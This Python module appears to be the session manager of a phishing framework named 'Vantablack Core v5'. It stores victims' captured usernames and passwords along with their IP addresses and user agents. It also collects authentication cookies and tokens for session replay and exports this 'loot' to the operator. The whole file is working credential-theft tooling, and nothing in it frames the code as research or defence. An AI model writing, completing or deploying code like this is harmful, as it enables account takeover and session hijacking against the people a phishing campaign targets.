"""
Vantablack Core v5 - Session Manager
====================================

Handles:
- Storage of captured credentials (username/password)
- Capture of authentication tokens (cookies, headers)
- Session replay capability
- Export to standardized format (JSON/Loot)
"""

import json
import logging
import os
from typing import Dict, List, Optional
from datetime import datetime
from pydantic import BaseModel, Field

class CapturedCredential(BaseModel):
    username: str
    password: str
    captured_at: datetime
    url: str

class CapturedSession(BaseModel):
    session_id: str
    campaign_id: str
    phishlet_name: str
    remote_ip: str
    user_agent: str
    credentials: List[CapturedCredential] = Field(default_factory=list)
    tokens: Dict[str, str] = Field(default_factory=dict)  # Cookie name -> value
    custom_data: Dict[str, str] = Field(default_factory=dict)
    is_authenticated: bool = False
    created_at: datetime = Field(default_factory=datetime.utcnow)
    last_activity: datetime = Field(default_factory=datetime.utcnow)

class SessionManager:
    def __init__(self, storage_path: str = "data/sessions.json"):
        self.logger = logging.getLogger("vantablack.edge.session")
        self.storage_path = storage_path
        self._sessions: Dict[str, CapturedSession] = {}
        self._load_from_disk()

    def _load_from_disk(self):
        """Load sessions from disk persistence"""
        if os.path.exists(self.storage_path):
            try:
                with open(self.storage_path, 'r') as f:
                    data = json.load(f)
                    for sid, sdata in data.items():
                        # Pydantic v2 model_validate or parse_obj
                        try:
                            # Convert string dates back to datetime if needed, 
                            # but Pydantic handles ISO strings well.
                            self._sessions[sid] = CapturedSession.model_validate(sdata)
                        except Exception as e:
                            self.logger.error(f"Failed to load session {sid}: {e}")
            except Exception as e:
                self.logger.error(f"Failed to load sessions from {self.storage_path}: {e}")

    def _save_to_disk(self):
        """Save all sessions to disk"""
        try:
            os.makedirs(os.path.dirname(self.storage_path), exist_ok=True)
            data = {sid: session.model_dump(mode="json") for sid, session in self._sessions.items()}
            with open(self.storage_path, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            self.logger.error(f"Failed to save sessions: {e}")

    def get_all_sessions(self) -> List[CapturedSession]:
        """Return all active sessions"""
        # Reload from disk to get latest updates from other processes
        self._load_from_disk()
        return list(self._sessions.values())

    def create_session(self, session_id: str, campaign_id: str, phishlet_name: str, ip: str, ua: str) -> CapturedSession:
        """Initialize a new visitor session"""
        # Reload first to ensure we don't overwrite
        self._load_from_disk()
        
        session = CapturedSession(
            session_id=session_id,
            campaign_id=campaign_id,
            phishlet_name=phishlet_name,
            remote_ip=ip,
            user_agent=ua,
            created_at=datetime.utcnow(),
            last_activity=datetime.utcnow()
        )
        self._sessions[session_id] = session
        self.logger.info(f"New session created: {session_id} ({ip})")
        self._save_to_disk()
        return session

    def get_session(self, session_id: str) -> Optional[CapturedSession]:
        self._load_from_disk()
        return self._sessions.get(session_id)

    def update_activity(self, session_id: str):
        if session := self._sessions.get(session_id):
            session.last_activity = datetime.utcnow()
            self._save_to_disk()

    def capture_credential(self, session_id: str, username: str, password: str, url: str):
        self._load_from_disk()
        if session := self._sessions.get(session_id):
            cred = CapturedCredential(
                username=username,
                password=password,
                captured_at=datetime.utcnow(),
                url=url
            )
            session.credentials.append(cred)
            self.logger.warning(f"CREDENTIAL CAPTURED for session {session_id}: {username}")
            self._save_to_disk()

    def capture_token(self, session_id: str, key: str, value: str):
        self._load_from_disk()
        if session := self._sessions.get(session_id):
            session.tokens[key] = value
            self.logger.info(f"Token captured for session {session_id}: {key}")
            # If we have tokens, mark as authenticated (heuristic, can be refined)
            session.is_authenticated = True
            self._save_to_disk()

    def export_loot(self, session_id: str) -> Dict:
        """Export session data for the operator"""
        self._load_from_disk()
        if session := self._sessions.get(session_id):
            return session.model_dump(mode="json")
        return {}
